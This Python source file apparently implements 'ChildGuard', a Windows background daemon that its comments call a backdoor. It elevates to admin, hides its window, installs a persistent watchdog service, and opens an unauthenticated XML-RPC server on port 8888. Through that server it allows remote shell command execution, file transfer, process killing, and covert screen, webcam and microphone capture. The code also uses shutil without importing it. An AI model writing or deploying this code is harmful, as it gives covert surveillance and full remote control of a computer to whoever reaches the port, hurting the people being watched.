#!python3
import os,sys,subprocess,re,json,time
import glob
import win32com.client as win32com  #pip install pywin32
import tempfile
from xmlrpc.server import SimpleXMLRPCServer
import xmlrpc.client
from socketserver import ThreadingMixIn
import threading
from multiprocessing import Process
import win32gui,win32process
import win32api,win32con,win32file,pywintypes
import ctypes,hashlib
from ctypes import wintypes
import pythoncom,socket
import win32serviceutil 
import win32service ,psutil
import win32event , winerror
import win32timezone #不import这个，虽然可以编译成exe，但执行时会报错，找这个东西
import servicemanager
from PIL import ImageGrab,Image,ImageDraw,ImageFont  #pip install Pillow
import cv2 #pip install opencv-python
import MyTTS
import inspect
VERSION='v0.9.2.20200527'

##后台后门守护程序##
'''
1. 以管理员身份执行
2. 如果是exe方式执行，释放出WatchDog.exe程序
3. 把WatchDog.exe安装成WatchDogC服务，使之开机自动运行
4. WatchDog.exe轮询ChildGuard.py/.exe，如未发现，启动它们
5. ChildGuard驻守后台，默认监听8888端口，等待连接
6. 注册各种函数，用于客户端访问调用
7. 等待客户端连接，做对应的action
'''
#由于在后台，先把标准输入给封了，否则容易报无效句柄
#sys.stdin=subprocess.DEVNULL

class ThreadXMLRPCServer(ThreadingMixIn, SimpleXMLRPCServer):
	#重新给xmlrpc封装多线程部分，否则xmlrpc.server只能响应单一连接
	pass
	'''
	def serve_forever(self):
		self.quit=False
		while not self.quit:
			self.handle_request()
	'''

class SYSTEM_POWER_STATUS(ctypes.Structure):
    #电源状态返回的数据结构，状态结果描述，见：https://docs.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-system_power_status
    _fields_ = [
        ('ACLineStatus', wintypes.BYTE),
        ('BatteryFlag', wintypes.BYTE),
        ('BatteryLifePercent', wintypes.BYTE),
        ('SystemStatusFlag', wintypes.BYTE),
        ('BatteryLifeTime', wintypes.DWORD),
        ('BatteryFullLifeTime', wintypes.DWORD),
    ]

app_path=os.path.dirname(os.path.abspath(sys.argv[0]))
print("app_path=%s" % app_path)

def now(ts=None): #返回当前日期
	 return time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(ts))

def ts(ts=None): #返回当前日期格式，用于文件后缀名使用
	 return time.strftime("%Y%m%d_%H%M%S", time.localtime(ts))

def version():
	return VERSION
	
def get_path():
	return {'app_path':app_path,'cwd':os.getcwd()}

def check_svc(service_name):
	watchdog_exist=False
	try:
		watchdog_exist=win32serviceutil.QueryServiceStatus(service_name)
	except:
		watchdog_exist=False
	return 	watchdog_exist

def start_svc(service_name):
	res=False
	try:
		mylog("in start_svc(),try to start svc=%s" % service_name)
		res=win32serviceutil.StartService(service_name)
	except:
		res=False
	return 	res	
	
def deal_run_tmp_path(): #处理exe当前运行程序的路径（%tmp%下的某个路径）
	service_name='WatchDogC'
	if getattr(sys, 'frozen', False):
		#要是运行在pyInstaller环境中，sys的frozen属性会被标记为True，解压的临时路径通过sys._MEIPASS来获得
		app_path = sys._MEIPASS
		app_path=app_path+"/"+"src"
		cdir=os.path.dirname(sys.argv[0])
		mylog("deal_run_tmp_path(),in EXE mode,cdir=%s" % cdir)
		try:
			shutil.copy(app_path+"/readme.txt",cdir+'/readme.txt')
			shutil.copy(app_path+"/WatchDog.exe",cdir+'//WatchDog.exe')
		except Exception as e:
			print(e)
		if not check_svc(service_name): #如果windows的服务里面，没有注册WatchDogC，那么生成一个，并启动它
			cmd1=cdir+'\\WatchDog.exe --interactive --startup auto install'
			#subprocess.Popen(cmd1, shell=True,close_fds=True)
			subprocess.Popen(cmd1)
			start_svc(service_name)
			if  check_svc(service_name): #要是检测到WatchDogC服务安装了，就退出当前的ChildGuard。由WatchDog周期自动调用
				sys.exit()
	else:
		mylog("deal_run_tmp_path(),not in EXE mode")
		app_path = os.path.dirname(os.path.abspath(__file__))
	return app_path

def wherePython():
	for p in os.environ['PATH'].split(';'):
		check_fname=os.path.join(p,'python.exe')
		if os.path.isfile(check_fname):
			return check_fname
	return None
	
def get_lock_file_name(port): #找到当前的临时路径，确认临时文件的名字，返回临时文件名字
	tempdir=tempfile.gettempdir()
	fname=os.path.basename(sys.argv[0])
	fname="%s-port%d" % (fname,port)
	#print("fname=%s" % fname)
	#print("tempdir=%s" % tempdir)
	if tempdir:
		lockfile=os.path.join(tempdir,fname+'.lck')
	else:
		lockfile=os.path.join(app_path,fname+'.lck')
	return lockfile
		 	 
def uptime(): #获得当前os的uptime
	ts=psutil.boot_time()
	return now(ts)

def create_time(): #获得当前ChildGuard程序启动时间，返回为unix epoch的时间戳
	return now(psutil.Process().create_time())	
	 
def mylog(ss,log=app_path+'/ChildGuard.log'): #记录log日志
	ss=str(ss)
	print(now()+'  '+ss)
	f=open(log,'a+',encoding='utf8')
	f.write(now()+'  '+ss+"\n")
	f.close()

def md5sum(fname): #给定文件名，计算md5，用于传输文件时，比对是否传输成功
	f=open(fname,'rb')
	m=hashlib.md5(f.read())
	f.close()
	return m.hexdigest()

def wf(fname,data,opt='w'):  #给定data，写到指定文件
	#client端要想发二进制文件内容时，得data=xmlrpc.client.Binary(open(xxx,'rb').read())
	data=data.data
	f=open(file=fname,mode=opt)
	f.write(data)
	f.close
	return md5sum(fname)

def rf(fname): #给定文件名，读取其内容，以及其md5，内容封装成可以http传输的格式
	f=open(fname,'rb')
	ss=f.read()
	f.close()
	return {'fname':os.path.basename(fname),
			'md5':md5sum(fname),
			'data':xmlrpc.client.Binary(ss)
			}

def myint(x): #如果不是整型，比如字符串，就直接赋值为0
	if type(x) !=int:
		x=0
	return x

def ll(pname='.',order='name',Reverse=False): #给定类似ll('c:/users/test/*.png')的查询，返回所有的文件/目录信息
	#pname为指定路径名字
	#order为指定排序方式，可以用name,time,size这3种
	#reverse为是否倒序排序
	if type(Reverse)==str:
		if Reverse.lower()=='true' or Reverse=='1':
			Reverse=True
		elif Reverse.lower()=='false' or Reverse=='0':
			Reverse=False

	if os.path.isdir(pname): #要是指定的是个目录，那就直接返回这个目录下的所有文件/目录信息
		paths=[os.path.join(pname,item) for item in os.listdir(pname)]
	else:
		paths=glob.glob(pname)
	res={}
	for path in paths:
		#print('path=%s' % path)
		try:
			stats=os.stat(path)
		except Exception as e:
			print(e)
			continue
		if os.path.isdir(path):
			res[path]={'mtime':now(stats.st_mtime),'size':'<DIR>'}
		else:
			res[path]={'mtime':now(stats.st_mtime),'size':stats.st_size}
	ret=[]
	if order=='time':
		names=[item[0] for item in sorted(res.items(),key=lambda k:k[1]['mtime'],reverse=Reverse)]   
	elif order=='size':
		names=[item[0] for item in sorted(res.items(),key=lambda k:myint(k[1]['size']),reverse=Reverse)]   
	else:
		names=list(res.keys())
		names.sort(reverse=Reverse)			
	for name in names:
		ret.append( [name,res[name]['mtime'],str(res[name]['size'])] )
	return ret
	
class Lock: #由于python的windows版本不支持POSIX的fnctl，只能直接用win自己的win32 API函数来实现文件排它锁了
	def __init__(self, filename):
		self.filename = filename
		#判断锁文件是否存在
		if os.path.isfile(filename):
			mylog("lockfile=%s already exist, will try to open it in Exclusive mode" % filename)
		else:
			mylog("lockfile=%s does not exist, will try to creat it in Exclusive mode" % filename)
		try:
			#尝试CreateFile一个锁文件
			self.handle= win32file.CreateFile(filename,win32con.GENERIC_WRITE,0,None,win32con.OPEN_ALWAYS, win32con.FILE_ATTRIBUTE_NORMAL,None) 
		except Exception as e:
			print(e)
			self.handle=None
		#self.handle= open(filename, 'w')
	#尝试给文件加锁
	def acquire(self):
		__overlapped = pywintypes.OVERLAPPED()
		try:
			mylog("trying to lock the lockfile:%s" % self.filename)
			win32file.LockFileEx(self.handle,win32con.LOCKFILE_EXCLUSIVE_LOCK,0,1,__overlapped)
		except Exception as e:
			print(e)
			return False
		return True
	#Lock类销毁时，自动关闭文件句柄和删除锁文件
	def __del__(self):
		try:
			win32file.CloseHandle(self.handle)
		except:
			pass
		try:
			os.unlink(self.filename)
		except:
			pass
			
def setFront(whnd):
	win32gui.SetForegroundWindow(whnd)
	
def msg(smsg): #给server发消息，这个发消息，需要等到点了确定后，才能得到返回
	whnd=0
	mylog("in msg(), from the beginning")
	try:
		whnd=win32gui.GetForegroundWindow()
	except Exception as e:
		mylog("in msg(),Erro:%s" % str(e))
	if not whnd:
		whnd=0
	mylog("whnd=%s" % whnd)
	global myTitle
	win32api.MessageBox(whnd, smsg, myTitle,win32con.MB_OK)
	
def msgImm(smsg): #这个发消息，直接多线程发，不等返回了
	t = threading.Thread(target=msg, args=(smsg,))
	t.start()

def tts(smsg,n=1): #发送文字消息，调用文字转语音模块，在电脑上播放此语音，n为播放语音次数
	msgImm(smsg) #先给电脑屏幕上显示下这段文字
	#注意的是，这里没有处理电脑音量大小问题，如果电脑静音或者插着耳机等特殊情况，没做考虑
	#循环n次，播放语音
	MyTTS.word_to_voice(smsg,n)

def snapAudio(seconds=10): #抓取指定时长的麦克风录音
	fname='snapAudio%s.mp3' % ts()
	#尝试录音，尝试以mp3格式存储，如果本机没有ffmpeg，会失败，那么返回当前pcm格式的wav文件名
	fname=MyTTS.get_mic_voice_file(fname,seconds,mp3=True) #录音seconds秒的录音
	return rf(fname)
	
def snapScreen(): #抓取电脑的屏幕，存成snapScreen20200315_220203.png的图片
	#调用PIL的ImageGrab来截屏
	fname='snapScreen%s.png' % ts()
	MAX_TRY=2
	im=None
	try:
		im=ImageGrab.grab()
	except Exception as e:
		mylog("ImageGrab Error:"+str(e))
	if im: #要是抓取成功了，直接返回
		im.save(fname)
		return rf(fname)
	#要是前面没有抓取成功，那么调用屏幕截屏来搞
	i=0
	while i<MAX_TRY:
		win32api.keybd_event(win32con.VK_SNAPSHOT, 0, 0, 0)
		time.sleep(1)
		win32api.keybd_event(win32con.VK_SNAPSHOT, 0, win32con.KEYEVENTF_KEYUP, 0)
		time.sleep(5)
		im = ImageGrab.grabclipboard()
		if im is None:
			mylog("ImageGrab.grabclipboard() got None,will try No.%d" % i )
		else:
			break
		i+=1
	if not im:
		mylog("in snapScreen(),got None , return None")
		return None
	try:
		im.save(fname)
	except:
		return None
	return rf(fname)

def markText(pic_name,text): #给一个图片上，打上文字，默认把文字放右下角
	try:
		setFont = ImageFont.truetype('arial.ttf', 25) ##选择文字字体和大小
	except Exception as e:
		print(e)
		setFont=None
	fillColor = "#FF0000"   #红色
	try:
		image = Image.open(pic_name)
	except Exception as e:
		print(e)
		print("can not Image.open: %s" % pic_name)
		return None
	width,height=image.size
	draw = ImageDraw.Draw(image)
	#image.show()
	draw.text((width-250,height-40),text,font=setFont,fill=fillColor,direction=None)
	#image.show()
	try:
		image.save(pic_name)
		image.close()
	except Exception as e:
		print(e)
	
def snapCam(): #调用电脑的第0个摄像头，抓拍一个图片
	#调用opencv-python的cv2的部分进行电脑摄像头拍照
	fname='snapCam%s.png' % ts()
	cap = cv2.VideoCapture(0)
	f, img = cap.read()#此刻拍照。MacAir抓拍的第一张总是糊的，估计是没对焦
	time.sleep(1)#等待1s，让摄像头做好准备
	f,img=cap.read() #此时再次拍照
	cv2.imwrite(fname,img)
	res=cv2.imencode('.jpg',img)[1].tofile(fname)
	cap.release()
	return rf(fname)

def mergePic(fname1,fname2,resName):
	#传进来图片1和图片2，合并成一个图片，然后删除图片1、2
	if not fname1 and not fname2: #要是两个图片都不对，就直接返回空
		return None
	if not fname1:
		return fname2  #要是fname1不对，那么直接返回fname2好了
	if not fname2:
		return fname1
	im1=Image.open(fname1)
	im2=Image.open(fname2)
	#print(im1.size)
	#print(im2.size)
	#两个图像大小不一样，拼好图像的宽为两张图片宽度之和
	#高度的话，取最大的那张的高
	tgt_width=im1.size[0]+im2.size[0]
	tgt_height=max(im1.size[1],im2.size[1])
	#print(tgt_width,tgt_height)
	#新建指定大小的空图片
	result=Image.new(im1.mode,(tgt_width,tgt_height))
	#先把图片1贴进去
	result.paste(im1,box=(0,0))
	#在把图片2贴进去，坐标取图片1宽度+1的坐标开始
	result.paste(im2,box=(im1.size[0]+1,0))
	result.save(resName)
	im1.close()
	im2.close()
	result.close()
	markText(resName,time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))
	try:
		os.unlink(fname1)
		os.unlink(fname2)
	except:
		pass
	return resName

def snapMerge():
	mylog("try to snapScreen() in snapMerge:")
	try:
		snap1=snapScreen()
	except Exception as e:
		print(e)
		snap1=None
	if snap1:
		fname1=snap1['fname']
	else:
		fname1=None
	mylog("try to snapCam() in snapMerge:")
	try:
		snap2=snapCam()
	except Exception as e:
		print(e)
		snap2=None
	if snap2:
		fname2=snap2['fname']
	else:
		fname2=None
	mergeName='snapMerge%s.png' % ts()
	print("in snapMerge(),fname1=%s,fname2=%s,mergeName=%s" % (fname1,fname2,mergeName))
	res=mergePic(fname1,fname2,mergeName)
	if not res:
		return None
	return rf(res)
	
def dimm_info():
	#返回当前内存条容量信息
	pythoncom.CoInitialize() #默认win32com是非线程安全的，要在线程中安全使用，要在开始时CoInitialize，在结束时CoUninitialize
	#mylog("in dimm_info()")
	wmi = win32com.GetObject('winmgmts:')
	#mylog("over wmi")
	wql="SELECT * FROM Win32_PhysicalMemory"
	#mylog("wql=%s" % wql)
	mems = wmi.ExecQuery(wql)
	#mylog('proc='+str(mems))
	n=len(mems)
	print("n=%d" % n)
	res=0
	cache=0
	for m in mems:
		res+=int(m.Capacity)
	res=int(res/1024/1024)
	pythoncom.CoUninitialize()
	mylog("dimm_info:%dMB" % res)
	return res	

def mem_usage():
	#获得cpu利用率
	pythoncom.CoInitialize() #默认win32com是非线程安全的，要在线程中安全使用，要在开始时CoInitialize，在结束时CoUninitialize
	#mylog("in cpu_usage()")
	wmi = win32com.GetObject('winmgmts:')
	#mylog("over wmi")
	wql="SELECT * FROM Win32_PerfRawData_PerfOS_Memory"
	#mylog("wql=%s" % wql)
	mems = wmi.ExecQuery(wql)
	#mylog('proc='+str(mems))
	n=len(mems)
	print("n=%d" % n)
	res=0
	for m in mems:
		res+=int(m.AvailableMBytes)
	pythoncom.CoUninitialize()
	total_mem=dimm_info()
	res={'mem_free':res,'mem_free_ratio':res/total_mem*100}
	mylog(json.dumps(res,indent=2))
	return res

def cpu_usage():
	return str(psutil.cpu_percent())

def disk_c_usage():
	return str(psutil.disk_usage('c:'))
def disk_io_counters():
	return str(psutil.disk_io_counters())
def net_io_counters():
	return str(psutil.net_io_counters())
def username():
	return 	str(psutil.Process().username())
		
def cpu_usage_OLD():
	#获得cpu利用率
	pythoncom.CoInitialize() #默认win32com是非线程安全的，要在线程中安全使用，要在开始时CoInitialize，在结束时CoUninitialize
	#mylog("in cpu_usage()")
	wmi = win32com.GetObject('winmgmts:')
	#mylog("over wmi")
	wql="SELECT * FROM Win32_Processor"
	#mylog("wql=%s" % wql)
	procs = wmi.ExecQuery(wql)
	#mylog('proc='+str(procs))
	n=len(procs)
	res=0
	for p in procs:
		res+=p.LoadPercentage
	res=res/n
	pythoncom.CoUninitialize()
	mylog("cpu_usage:%.2f" % res)
	return res
	
def my_exec(cmd):
	#远程执行指定命令的接口
	stdout_org=sys.stdout
	stderr_org=sys.stderr
	proc=subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.DEVNULL, shell=True)
	ret= proc.communicate()
	res={}
	res['stdout']=ret[0].decode('gbk')
	res['stderr']=ret[1].decode('gbk')
	sys.stdout=stdout_org
	sys.stderr=stderr_org	
	return res

def killProcess(pid):
	#给定pid，kill -9它
	pid=int(pid)
	mylog("trying to kill pid=%s" % pid)
	ret=os.kill(pid,9)
	return ret

def getProcess(pids=None,captions=None):
	#获得当前后台所有程序，或给定pid、caption来查询对应的程序
	#可以getProcess(16432)给定一个pid来查，也可以getProcess([16432,38320])给定多个pid来查
	#可以getProcess(captions=['notepad.exe','uedit64.exe'])给定多个captions来查
	#失败返回 None
	if type(pids)==int:
		pids=[pids]
	elif type(pids)==str:
		pids=[int(pids)]
	elif type(pids)==list:
		pass
	else:
		pids=[0]
	if type(captions)==str:
		captions=[captions]
	elif type(captions)==list:
		pass
	else:
		captions=[0]
	pythoncom.CoInitialize() #默认win32com是非线程安全的，要在线程中安全使用，要在开始时CoInitialize，在结束时CoUninitialize
	mylog("in getProcess(),pids=%s,captions=%s" % (str(pids),str(captions)))
	wmi = win32com.GetObject('winmgmts:')
	mylog("over wmi")
	if not pids[0]==None and not pids[0]==0:
		b=['ProcessId='+str(pid) for pid in pids]
		wql="SELECT * FROM Win32_Process where %s" % " or ".join(b)
	elif not captions[0]==None and not captions[0]==0: #WQL是忽略大小写的，可以不用再转小写了
		b=["Caption='%s'" % c for c in captions]
		wql="SELECT * FROM Win32_Process where %s" % " or ".join(b)
	else:
		wql="SELECT * FROM Win32_Process "
	mylog("wql=%s" % wql)
	procs = wmi.ExecQuery(wql)
	mylog('proc='+str(procs))
	procs_dict=[]
	for p in procs:
		procs_dict.append({'cmd':p.CommandLine,
			'name':p.name,
			'caption':p.caption,
			'pid':p.ProcessId}
			)
	pythoncom.CoUninitialize()
	return procs_dict


def getActiveWh(): #获得当前活动的窗口句柄（window handler）
	try:
		wh=win32gui.GetForegroundWindow()
	except:
		wh=0
	return wh
	
def getActiveProcName():
	#获得当前在前台的进程名字
	try:
		wh=win32gui.GetForegroundWindow()
		text=win32gui.GetWindowText(wh)
		mylog('wh='+str(wh)+'text='+text)
		pids = win32process.GetWindowThreadProcessId(wh)
		mylog("pids=%s" % str(pids))
		pid=pids[1]
		mylog("pids=%s" % str(pids))
		#os.system('tasklist|findstr %s' % str(pid))
		#os.system('tasklist|findstr /i python' )
		proc_info=getProcess(pid)
		mylog("proc_info=%s" % str(proc_info))
		if proc_info:
			proc_info[0]['text']=text
			return(proc_info[0])
		else:
			return None
	except Exception as e:
		mylog("Exception in getActiveProcName()")
		mylog(e)
		return None		

def get_hwnd_by_pids(pids): #给定一个或者一组pid，返回其对应的窗口句柄以及其标题text信息
	if type(pids)==int:
		pids=[pids]
	elif type(pids)==str:
		pids=[int(pids)]
	elif type(pids)==list and len(pids)>0:
		pass
	else:
		pids=[0]
	print(pids)
	def callback(hwnd, hwnds):
		found_pid=None
		#if win32gui.IsWindowEnabled(hwnd):
		_, found_pid = win32process.GetWindowThreadProcessId(hwnd)
		if found_pid in pids:
			hwnds.append({'pid':found_pid,'text':win32gui.GetWindowText(hwnd),'wh':hwnd})
		return True	
	hwnds = []
	win32gui.EnumWindows(callback, hwnds)
	#print(hwnds)
	return hwnds 
	
def GetSystemPowerStatus():
	#获得系统电源状态信息
	#MSDN win32api函数用法，见：
	#https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getsystempowerstatus
	mylog("GetSystemPowerStatus...")
	SYSTEM_POWER_STATUS_P = ctypes.POINTER(SYSTEM_POWER_STATUS)
	GetSystemPowerStatus = ctypes.windll.kernel32.GetSystemPowerStatus
	GetSystemPowerStatus.argtypes = [SYSTEM_POWER_STATUS_P]
	GetSystemPowerStatus.restype = wintypes.BOOL
	status = SYSTEM_POWER_STATUS()
	mylog("in GetSystemPowerStatus(),after parameter preparing...")
	if not GetSystemPowerStatus(ctypes.pointer(status)):
	    mylog(str(ctypes.WinError()))
	    return {}
	res={
		'ACLineStatus':status.ACLineStatus,
		'BatteryFlag': status.BatteryFlag,
		'BatteryLifePercent': status.BatteryLifePercent,
		'SystemStatusFlag': status.SystemStatusFlag,
		'BatteryLifeTime': str(status.BatteryLifeTime), #这个数64bit的，但xmlrpc只能传送32bit的int，这里只能str下，才能传过去了
		'BatteryFullLifeTime': str(status.BatteryFullLifeTime)  #这个数64bit的，但xmlrpc只能传送32bit的int，这里只能str下，才能传过去了
	}
	mylog("in GetSystemPowerStatus(),%s" % json.dumps(res,indent=2))
	return res
	
def net_info():
	#获得网络地址和主机名信息
	res={}
	res['hostname']=socket.gethostname()
	socket_addrs=socket.getaddrinfo(res['hostname'],None)
	res['addrs']=[]
	for addr in socket_addrs:
		ip=addr[4][0]
		res['addrs'].append(ip)
	return res
		
def is_admin():
	#是否运行在管理员权限下
	try:
		return ctypes.windll.shell32.IsUserAnAdmin()
	except:
		return False
		
def help(func_name=None):
	print("func_name=%s" % func_name)
	global str_allow_funcs,allow_funcs
	if not func_name:
		return(allow_funcs)
	else:
		func=globals()[func_name]
		return str(inspect.getfullargspec(func))
	
def exit():
	mylog("received exit request , will quit")
	global s
	s.shutdown()
	
def main(port=8888):
	#如果是ChildGurad nohide的命令行运行，则不做隐藏窗口的动作，便于观察调试
	mylog("sys.argv=%s" % str(sys.argv))
	if len(sys.argv) >1 and re.findall(r'port=(\d+)',sys.argv[1],re.IGNORECASE):
		match=re.findall(r'port=(\d+)',sys.argv[1],re.IGNORECASE)
		port=int(match[0])
	if 'nohide' not in sys.argv: #如果没有nohide参数，
		#获得dos console句柄方式隐藏dos窗口，可以这个daemon正常运行
		#直接改.py为.pyw虽然可以运行，但client访问时，总是报http.client.BadStatusLine
		whnd = ctypes.windll.kernel32.GetConsoleWindow() 
		if whnd != 0:
			ctypes.windll.user32.ShowWindow(whnd, 0)
			ctypes.windll.kernel32.CloseHandle(whnd)	
	global s
	s = ThreadXMLRPCServer(("", port), allow_none=True)
	global str_allow_funcs,allow_funcs
	str_allow_funcs='''now md5sum wf rf my_exec killProcess getProcess 
		getActiveProcName getActiveWh get_hwnd_by_pids cpu_usage mem_usage dimm_info msg msgImm
		get_path tts net_info is_admin GetSystemPowerStatus uptime
		create_time username disk_c_usage disk_io_counters net_io_counters
		snapScreen snapCam snapMerge snapAudio ll exit help version
		'''
	allow_funcs=str_allow_funcs.split()
	for func in allow_funcs:
		#globals()['md5sum']()的调用方式，等同于md5sum()的调用
		#另外可以用md5sum.__name__方式，获得函数名字'md5sum'
		s.register_function(globals()[func])
	
	mylog("trying to run xml rpc server,pid=%s" % os.getpid())
	mylog("trying to monitor port:%d on the bellow networks:\n%s" % (port,json.dumps(net_info(),indent=2) ))
	run_mode=is_admin()
	mylog("run_admin_mode=%s" % str(run_mode))
	s.serve_forever()
	
def run_as_admin(argv=sys.argv, debug=False):
	exe_file=''
	params=''
	if getattr(sys, 'frozen', False): #exe二进制运行情况
		#要是运行在pyInstaller环境中，sys的frozen属性会被标记为False，解压的临时路径通过sys._MEIPASS来获得
		exe_file=os.path.abspath(argv[0])
		drop_name=argv[0]#把sys.argv[0]的数据去掉，它是xxx.exe，剩下的才是参数
		params=" ".join(argv[1:])
	else: #.py脚本模式运行情况
		exe_file=os.path.abspath(sys.executable)
		params=" ".join(argv)
	#print("__file__=",__file__)
	print("exe_file=%s\nprams=%s" % (exe_file,params))
	if is_admin():
		print("got admin pravilage")
		return True
	#没有管理员权限，就提权后，重新执行下自己
	ret=ctypes.windll.shell32.ShellExecuteW(None, "runas", exe_file, params, None, 1)
	if ret<=32:
		return False
	return None

def check_lock_by_port(port): #根据给定的端口，判断锁文件情况，从而确定是否程序多开，如果多开，则退出
	lockfile=get_lock_file_name(port)
	lock=Lock(lockfile)
	if not lock.acquire():
		mylog("[ERROR]:another process is already running!\n quit now")
		sys.exit(1)		

if __name__=='__main__': 
	port=8888
	if len(sys.argv) >1 and re.findall(r'port=(\d+)',sys.argv[1],re.IGNORECASE):
		match=re.findall(r'port=(\d+)',sys.argv[1],re.IGNORECASE)
		port=int(match[0])
	global myTitle
	myTitle="提醒"
	#print("\n".join(sys.modules))
	ret=run_as_admin(sys.argv)
	if ret==True: #
		check_lock_by_port(port)
		run_tmp_path=deal_run_tmp_path() #有管理权限的话，就尝试释放里面打包的内容，并注册WatchDogC的service
		mylog("app_path=%s,run_tmp_path=%s" % (app_path,run_tmp_path))		
		main()
	elif ret==None: #当前不是管理员，申请提权的中间过程中
		print("trying to get admin privlege")
	else: #没拿到管理员权限，只能以普通权限运行
		msg("没有管理员权限，无法处理windows服务相关，本程序无法运行！")
